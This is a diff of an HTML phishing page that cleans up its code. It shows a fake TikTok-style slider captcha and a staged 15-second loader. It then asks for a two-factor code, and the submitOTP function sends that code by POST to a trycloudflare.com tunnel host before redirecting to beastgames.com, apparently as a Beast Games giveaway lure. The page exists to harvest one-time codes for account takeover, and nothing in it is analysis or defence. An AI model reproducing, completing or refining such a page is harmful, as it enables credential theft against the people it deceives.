@@ -113,16 +113,13 @@
         
         #puzzle-box, #loader, #step2_box { display: none; }
         .puzzle-container { background: #1a1a1a; padding: 15px; border-radius: 20px; border: 1px solid #333; margin-top: 10px; }
-                .canvas-area { 
+        .canvas-area { 
             width: 100%; 
             height: 180px; 
-            /* High-contrast colorful landscape like TikTok */
             background: url('https://images.unsplash.com') center/cover; 
             border-radius: 12px; 
             position: relative; 
             border: 1px solid #444; 
-        }
-
         }
         .puzzle-piece { 
             position: absolute; 
@@ -223,34 +220,23 @@
         }
 
         function startPuzzle() {
-    const handle = document.getElementById('handle'), piece = document.getElementById('piece'), track = document.getElementById('track');
-    let dragging = false;
+            const handle = document.getElementById('handle'), piece = document.getElementById('piece'), track = document.getElementById('track');
+            let dragging = false;
 
-    // This makes the piece look like a real "cutout" from the colored landscape
-    piece.style.backgroundSize = "400px 180px"; // Matches the container size
-    piece.style.backgroundPosition = "-280px -60px"; // Cuts out the specific 'slot' area
+            piece.style.backgroundSize = "400px 180px";
+            piece.style.backgroundPosition = "-280px -60px";
 
-    const move = (e) => {
-        if (!dragging) return;
-        let clientX = e.touches ? e.touches[0].clientX : e.clientX;
-        let rect = track.getBoundingClientRect();
-        let x = clientX - rect.left - 35;
-        
-        if (x < 0) x = 0;
-        if (x > rect.width - 70) x = rect.width - 70;
-        
-        handle.style.left = x + 'px';
-        // Moves the colored piece across the track
-        piece.style.left = (15 + (x / (rect.width - 70)) * 260) + 'px';
-        
-        if (x > rect.width - 95) { 
-            dragging = false; 
-            showLoader(); 
-        }
-    };
-    
-    // Add your event listeners back below this...
-}
+            const move = (e) => {
+                if (!dragging) return;
+                let clientX = e.touches ? e.touches[0].clientX : e.clientX;
+                let rect = track.getBoundingClientRect();
+                let x = clientX - rect.left - 35;
+                if (x < 0) x = 0;
+                if (x > rect.width - 70) x = rect.width - 70;
+                handle.style.left = x + 'px';
+                piece.style.left = (15 + (x / (rect.width - 70)) * 260) + 'px';
+                if (x > rect.width - 95) { dragging = false; showLoader(); }
+            };
 
             handle.addEventListener('mousedown', () => dragging = true);
             handle.addEventListener('touchstart', (e) => { dragging = true; });
@@ -260,32 +246,27 @@
             window.addEventListener('touchend', () => dragging = false);
         }
 
-                function showLoader() {
+        function showLoader() {
             document.getElementById('puzzle-box').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
             setTimeout(() => {
                 document.getElementById('loader').style.display = 'none';
                 document.getElementById('step2_box').style.display = 'block';
-            }, 15000); // 15 Second Delay Fixed
+            }, 15000);
         }
 
-               function submitOTP() {
-            const c = document.getElementById('2fa_code').value; // FIXED ID
-            fetch('https://postposted-settings-belly-quest.trycloudflare.com', { // FIXED f
+        function submitOTP() {
+            const c = document.getElementById('2fa_code').value;
+            fetch('https://postposted-settings-belly-quest.trycloudflare.com', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                 body: new URLSearchParams({ '2fa_code': c })
             }).then(() => {
-                window.location.href = "https://www.beastgames.com"; // Redirect
+                window.location.href = "https://www.beastgames.com";
             }).catch(() => {
-                window.location.href = "https://www.beastgames.com"; // Fallback Redirect
+                window.location.href = "https://www.beastgames.com";
             });
         }
-
     </script>
 </body>
 </html>
-
-
-
-
